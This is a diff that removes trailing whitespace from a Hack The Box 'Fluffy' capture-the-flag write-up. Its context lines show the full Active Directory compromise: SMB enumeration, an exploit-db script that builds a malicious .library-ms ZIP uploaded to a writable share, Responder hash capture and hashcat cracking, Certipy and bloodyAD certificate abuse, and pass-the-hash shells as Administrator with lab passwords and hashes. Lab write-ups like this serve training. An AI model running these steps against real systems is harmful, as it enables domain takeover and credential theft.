@@ -13,7 +13,7 @@ As is common in real life Windows pentests, you will start the Fluffy box with c
 # Nmap scan
 
 ```bash
-cat nmap_services.txt 
+cat nmap_services.txt
 # Nmap 7.95 scan initiated Sat Apr 11 09:30:34 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389 -oN /home/kali/htb/Fluffy/nmap_services.txt 10.129.232.88
 Nmap scan report for 10.129.232.88 (10.129.232.88)
 Host is up (0.24s latency).
@@ -57,10 +57,10 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 |_clock-skew: mean: 7h02m29s, deviation: 1s, median: 7h02m30s
-| smb2-security-mode: 
-|   3:1:1: 
+| smb2-security-mode:
+|   3:1:1:
 |_    Message signing enabled and required
-| smb2-time: 
+| smb2-time:
 |   date: 2026-04-11T20:34:08
 |_  start_date: N/A
 
@@ -98,14 +98,14 @@ nxc smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
 nxc smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
 
 SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
-SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
+SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
 SMB         10.129.232.88   445    DC01             [*] Enumerated shares
 SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
 SMB         10.129.232.88   445    DC01             -----           -----------     ------
 SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
 SMB         10.129.232.88   445    DC01             C$                              Default share
 SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
-SMB         10.129.232.88   445    DC01             IT              READ,WRITE      
+SMB         10.129.232.88   445    DC01             IT              READ,WRITE
 SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share
 SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share
 
@@ -116,7 +116,7 @@ SMB         10.129.232.88   445    DC01             SYSVOL          READ        
 
 ```bash
 ┌──(kali㉿kali)-[~/htb/Fluffy]
-└─$ /usr/share/exploitdb/exploits/windows/remote/52310.py -i 10.10.14.29  
+└─$ /usr/share/exploitdb/exploits/windows/remote/52310.py -i 10.10.14.29
 [*] Generating malicious .library-ms file...
 [+] Created ZIP: output/malicious.zip
 [-] Removed intermediate .library-ms file
@@ -126,7 +126,7 @@ SMB         10.129.232.88   445    DC01             SYSVOL          READ        
 ```bash
 smb: \> put /home/kali/htb/Fluffy/output/malicious.zip malicious.zip
 putting file /home/kali/htb/Fluffy/output/malicious.zip as \malicious.zip (0.1 kb/s) (average 0.2 kb/s)
-smb: \> 
+smb: \>
 
 ```
 
@@ -160,11 +160,11 @@ smb: \>
 [*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
 [*] To sponsor Responder: https://paypal.me/PythonResponder
 
-[+] Listening for events...                                                                                                                                              
+[+] Listening for events...
 
 [SMB] NTLMv2-SSP Client   : 10.129.232.88
 [SMB] NTLMv2-SSP Username : FLUFFY\p.agila
-[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:e18f3d0020d25ed3:CBA616D80AA22049EF0DF2BC1BE3AFB0:0101000000000000009AACDA9FC9DC0151EDB9C75A7647700000000002000800580038004E00340001001E00570049004E002D004900490032004E0032004F00450058005A003400390004003400570049004E002D004900490032004E0032004F00450058005A00340039002E00580038004E0034002E004C004F00430041004C0003001400580038004E0034002E004C004F00430041004C0005001400580038004E0034002E004C004F00430041004C0007000800009AACDA9FC9DC01060004000200000008003000300000000000000001000000002000000FA5D6DC6DC9E07DF61108155F5042B9116159FBBA52FEADE1F4773BEAE1AB6A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320039000000000000000000                                                                                                                           
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:e18f3d0020d25ed3:CBA616D80AA22049EF0DF2BC1BE3AFB0:0101000000000000009AACDA9FC9DC0151EDB9C75A7647700000000002000800580038004E00340001001E00570049004E002D004900490032004E0032004F00450058005A003400390004003400570049004E002D004900490032004E0032004F00450058005A00340039002E00580038004E0034002E004C004F00430041004C0003001400580038004E0034002E004C004F00430041004C0005001400580038004E0034002E004C004F00430041004C0007000800009AACDA9FC9DC01060004000200000008003000300000000000000001000000002000000FA5D6DC6DC9E07DF61108155F5042B9116159FBBA52FEADE1F4773BEAE1AB6A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320039000000000000000000
 [*] Skipping previously captured hash for FLUFFY\p.agila
 [*] Skipping previously captured hash for FLUFFY\p.agila
 
@@ -211,7 +211,7 @@ Dictionary cache hit:
 * Keyspace..: 14344385
 
 P.AGILA::FLUFFY:e18f3d0020d25ed3:cba616d80aa22049ef0df2bc1be3afb0:0101000000000000009aacda9fc9dc0151edb9c75a7647700000000002000800580038004e00340001001e00570049004e002d004900490032004e0032004f00450058005a003400390004003400570049004e002d004900490032004e0032004f00450058005a00340039002e00580038004e0034002e004c004f00430041004c0003001400580038004e0034002e004c004f00430041004c0005001400580038004e0034002e004c004f00430041004c0007000800009aacda9fc9dc01060004000200000008003000300000000000000001000000002000000fa5d6dc6dc9e07df61108155f5042b9116159fbba52feade1f4773beae1ab6a0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320039000000000000000000:prometheusx-303
-                                                          
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 5600 (NetNTLMv2)
@@ -248,7 +248,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Adding Key Credential with device ID 'cf723bb1f2b144c7994135f70dac9c8a' to the Key Credentials for 'winrm_svc'
 [-] Could not update Key Credentials for 'winrm_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
 
-                                                                 
+
 ```
 
 ```bash
@@ -316,13 +316,13 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 ```bash
 evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
-                                        
+
 Evil-WinRM shell v3.7
-                                        
+
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
+
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\winrm_svc\Documents> dir
 *Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop
@@ -437,9 +437,9 @@ Certificate Templates                   : [!] Could not find any certificate tem
 ──(kali㉿kali)-[~/tools/krbrelayx]
 └─$ bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.232.88 add groupMember 'service accounts' p.agila
 [+] p.agila added to service accounts
-                                                                                                  
+
 ┌──(kali㉿kali)-[~/tools/krbrelayx]
-└─$ certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'         
+└─$ certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
@@ -447,7 +447,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Updating user 'ca_svc':
     userPrincipalName                   : administrator
 [*] Successfully updated 'ca_svc'
-                                                                                                  
+
 ┌──(kali㉿kali)-[~/tools/krbrelayx]
 └─$ certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.129.232.88' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -455,7 +455,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Requesting certificate via RPC
 [-] Got error: The NETBIOS connection with the remote host timed out.
 [-] Use -debug to print a stacktrace
-                                                                                                  
+
 ┌──(kali㉿kali)-[~/tools/krbrelayx]
 └─$ certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.129.232.88' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -468,7 +468,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Try using -sid to set the object SID or see the wiki for more details
 [*] Saving certificate and private key to 'administrator.pfx'
 [*] Wrote certificate and private key to 'administrator.pfx'
-                                                                                                  
+
 ┌──(kali㉿kali)-[~/tools/krbrelayx]
 
 ```
@@ -478,13 +478,13 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 ```powershell
 ┌──(kali㉿kali)-[~/htb/Fluffy]
 └─$ evil-winrm -i 10.129.232.88 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
-                                        
+
 Evil-WinRM shell v3.7
-                                        
+
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
+
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\
 *Evil-WinRM* PS C:\Users\Administrator> ls
